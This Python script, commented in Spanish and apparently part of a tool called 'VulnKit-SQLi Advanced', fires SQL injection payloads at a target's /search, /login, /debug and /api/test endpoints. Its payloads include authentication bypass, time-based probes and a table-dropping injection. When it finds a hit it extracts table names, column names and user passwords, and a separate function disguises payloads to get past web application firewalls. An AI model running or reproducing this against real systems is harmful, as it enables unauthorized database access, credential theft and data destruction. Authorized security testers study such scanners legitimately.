import requests
import time
from urllib.parse import quote

def execute(target):
    print(f"\n[INFO] Iniciando prueba avanzada de SQL Injection en: {target}")

    # Lista de payloads avanzados
    payloads = [
        "' OR '1'='1' --",                     # Autenticación básica
        "' UNION SELECT NULL, NULL --",        # UNION básica
        "' UNION SELECT database(), version() --",  # Datos de la base
        "' AND SLEEP(5) --",                   # Prueba de tiempo
        "' AND 1=CAST((SELECT SLEEP(5)) AS SIGNED) --", # Bypass básico
        "' OR EXISTS (SELECT 1 FROM users) --", # Verificación de tablas
        "'; DROP TABLE users; --",             # Eliminación de tabla
    ]

    # Indicadores de vulnerabilidad
    vulnerability_indicators = [
        "syntax error", "unclosed quotation", "mysql", "you have an error",
        "database", "unexpected token", "sqlite", "ORA-", "pg_query",
        "stacktrace", "column not found"
    ]

    # Cabeceras para evitar bloqueos
    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-SQLi Advanced)",
        "Accept": "*/*"
    }

    # Candidatos a endpoints vulnerables
    endpoints = ["/search", "/login", "/debug", "/api/test"]
    vulnerable_endpoints = []

    for endpoint in endpoints:
        for payload in payloads:
            url = f"http://{target}{endpoint}?q={quote(payload)}"
            print(f"\n[INFO] Probando URL: {url}")
            try:
                start_time = time.time()
                response = requests.get(url, headers=headers, timeout=10)
                response_time = time.time() - start_time

                if is_vulnerable(response, response_time, payload):
                    vulnerable_endpoints.append({
                        "url": url,
                        "payload": payload,
                        "response_time": f"{response_time:.2f}s",
                        "response_preview": response.text[:500]  # Vista previa
                    })
                    extract_sensitive_data(url)  # Intento de extracción
            except requests.Timeout:
                print(f"[ERROR] Tiempo de espera agotado para {url}")
            except requests.ConnectionError:
                print(f"[ERROR] No se pudo conectar con {url}")
            except Exception as e:
                print(f"[ERROR] Error inesperado en {url}: {e}")

    if vulnerable_endpoints:
        print("\n[RESULTADOS] Vulnerabilidades detectadas:")
        for vuln in vulnerable_endpoints:
            print(f" - Endpoint: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Tiempo de respuesta: {vuln['response_time']}")
            print(f"   Vista previa: {vuln['response_preview']}")
        return "Vulnerable a SQL Injection"
    else:
        print("\n[INFO] No se detectaron vulnerabilidades en los endpoints probados.")
        return "No vulnerable"

def is_vulnerable(response, response_time, payload):
    """
    Verifica si un endpoint es vulnerable con base en:
    - Indicadores de error.
    - Comportamiento anómalo en tiempo de respuesta (SQL Injection basada en tiempo).
    """
    indicators = [
        "syntax error", "mysql", "sqlite", "database",
        "ORA-", "unexpected token", "stacktrace"
    ]
    if any(indicator in response.text.lower() for indicator in indicators):
        print(f"[ALERTA] SQL Injection detectada con payload: {payload}")
        return True
    if "SLEEP" in payload and response_time > 4:
        print(f"[ALERTA] Vulnerabilidad basada en tiempo detectada con payload: {payload}")
        return True
    return False

def extract_sensitive_data(vulnerable_url):
    """
    Extrae datos sensibles si se confirma SQL Injection.
    """
    print(f"\n[INFO] Intentando extraer información de la base de datos desde: {vulnerable_url}")
    
    # Payloads específicos de extracción
    data_extraction_payloads = [
        "' UNION SELECT database(), version() --", # Nombre y versión de la base
        "' UNION SELECT table_name, NULL FROM information_schema.tables --",
        "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT username, password FROM users --"
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-SQLi Advanced)",
        "Accept": "*/*"
    }

    for payload in data_extraction_payloads:
        try:
            exploit_url = f"{vulnerable_url.split('?')[0]}?q={quote(payload)}"
            response = requests.get(exploit_url, headers=headers, timeout=10)
            if response.status_code == 200:
                print(f"[INFO] Resultado del payload '{payload}':\n{response.text[:500]}")
            else:
                print(f"[INFO] Sin resultados para el payload: {payload}")
        except Exception as e:
            print(f"[ERROR] Error al extraer datos con payload '{payload}': {e}")

def bypass_waf(payload):
    """
    Implementa técnicas para evitar WAFs (Web Application Firewalls).
    """
    techniques = [
        lambda p: p.replace(" ", "/**/"),  # Comentarios
        lambda p: p.replace("UNION", "UnIoN"),  # Capitalización
        lambda p: p.replace("SELECT", "SeLeCt"),
        lambda p: p.replace("=", "LIKE")  # Sustituciones
    ]
    bypassed_payloads = [tech(payload) for tech in techniques]
    return bypassed_payloads
